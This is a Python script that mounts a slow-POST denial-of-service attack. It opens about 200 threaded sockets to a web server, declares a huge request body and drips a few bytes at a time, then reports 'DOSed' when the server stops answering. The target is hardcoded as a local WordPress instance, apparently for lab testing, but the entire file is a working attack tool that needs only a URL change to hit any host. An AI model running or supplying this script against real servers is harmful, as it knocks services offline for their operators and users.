from urllib.parse import urlparse
from time import sleep
import socket
import threading
import urllib
from urllib.request import urlopen

def openConnections(url, threads, sleepTime) :
    urlParts = urlparse(url)
    if (urlParts.scheme != 'http'):
        raise Exception('Only the http protocol is currently supported')

    port = urlParts.port

    if port == None: port = 80

    print ("Opening %d sockets to %s:%d" % (threads, urlParts.hostname, port))

    pool = []
    try:
        for i in range(1, threads):
            t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
            pool.append(t)
            t.start()

        print ("Started %d threads. Hit ctrl-c to exit" % (threads))
        
        try:
            req = urllib.request.Request(url)
            htmltext = urlopen(req, timeout=10)
        except socket.timeout as e:
            print("DOSed")
            for worker in pool: worker.stop()

            for worker in pool: worker.join()         

    except KeyboardInterrupt as e:
        print ("\nCaught keyboard interrupt. Stopping all threads")

        for worker in pool: worker.stop()

        for worker in pool: worker.join()

class Worker (threading.Thread):
    def __init__(self, host, port, path, sleepTime) :
        self.host = host
        self.port = port
        self.path = path
        self.sleepTime = sleepTime
        self.stopped = False
        threading.Thread.__init__(self)

    def stop(self): self.stopped = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.settimeout(1)
        strin = "POST " + self.path +  "HTTP/1.1\r\n "+ "Host: " + self.host + "\r\n" +"Connection: close\r\n" +"Content-Length: 1000000\r\n" +"\r\n"
        s.send(strin.encode('UTF-8'))

        while not self.stopped:
            s.send('abc=123&'.encode('UTF-8'))
            sleep(self.sleepTime/1000) 

        s.close
        
url = "http://127.0.0.1/wordpress"

openConnections(url, 200, 1000)